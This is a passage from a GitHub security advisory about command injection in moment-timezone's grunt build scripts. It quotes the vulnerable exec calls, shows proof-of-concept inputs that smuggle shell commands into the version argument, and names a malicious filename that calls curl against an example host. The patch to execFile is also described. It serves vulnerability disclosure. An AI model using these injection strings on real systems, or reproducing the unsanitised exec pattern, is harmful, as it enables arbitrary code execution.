Download data from iana.org/time-zones.', function (version) {\n8          version = version || 'latest';\n\n10          var done  = this.async(),\n11              src   = 'ftp://ftp.iana.org/tz/tzdata-latest.tar.gz',\n12              curl  = path.resolve('temp/curl', version, 'data.tar.gz'),\n13              dest  = path.resolve('temp/download', version);\n...\n24          exec('curl ' + src + ' -o ' + curl + ' && cd ' + dest + ' && gzip -dc ' + curl + ' | tar -xf -', function (err) {\n```\n\nOrdinarily, one one run this script using something like `grunt data-download:2014d`, in which case version would have the value `2014d`. However, if an attacker were to provide additional content on the command line, they would be able to execute arbitrary code\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-download:2014d ; echo flag>/tmp/foo #'\n\\Running \"data-download:2014d ; echo flag>/tmp/foo #\" (data-download) task\n>> Downloading https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n>> Downloaded https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n\nDone.\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/foo\nflag\n```\n\n#### Command Injection via data-zdump.js\n\nThe `tasks/data-zdump.js` script reads a list of files present in a temporary directory (created by previous tasks), and for each one, assembles and executes a command line without sanitization. As a result, an attacker able to influence the contents of that directory could gain code execution. This attack is exacerbated by timezone data being downloaded via cleartext FTP (described above), but beyond that, an attacker at iana.org able to modify the timezone files could disrupt any systems that build moment-timezone.\n\n```\n15              files     = grunt.file.expand({ filter : 'isFile', cwd : 'temp/zic/' + version }, '**/*');\n...\n27          function next () {\n...\n33              var file = files.pop(),\n34                  src  = path.join(zicBase, file),\n35                  dest = path.join(zdumpBase, file);\n36              exec('zdump -v ' + src, { maxBuffer: 20*1024*1024 }, function (err, stdout) {\n```\n\nIn this case, an attacker able to add a file to `temp/zic/2014d` (for example) with a filename like `Z; curl www.example.com` would influence the called to exec on line 36 and run arbitrary code. There are a few minor challenges in exploiting this, since the string needs to be a valid filename.\n\n#### Command Injection via data-zic.js\n\nSimilar to the vulnerability in /tasks/data-download.js, the /tasks/data-zic.js script takes a version from the command line and uses it as part of a command line, executed without sanitization.\n\n```\n10          var done  = this.async(),\n11              dest  = path.resolve('temp/zic', version),\n...\n22              var file = files.shift(),\n23                  src = path.resolve('temp/download', version, file);\n24\n25              exec('zic -d ' + dest + ' ' + src, function (err) {\n```\n\nAs a result, an attacker able to influence that string can run arbitrary commands. Of course, it requires an attacker able to influence the command passed to grunt, so may be unlikely in practice.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-zic:2014d; echo hi > /tmp/evil; echo '\nRunning \"data-zic:2014d; echo hi > /tmp/evil; echo \" (data-zic) task\nexec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; echo hi > /tmp/evil; echo  /usr/src/app/moment-timezone/temp/download/2014d; echo hi > /tmp/evil; echo /africa\n...\n\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil\nhi\n```\n\n### Patches\n\nThe supplied patch on top of 0.5.34 is applicable with minor tweaks to all affected versions. It switches `exec` to `execFile` so arbitrary bash fragments won't be executed any more.\n\n### References\n\n* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html\n* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/","url":"https://github.com/advisories/GHSA-56x4-j7p9-fcf9"}}}
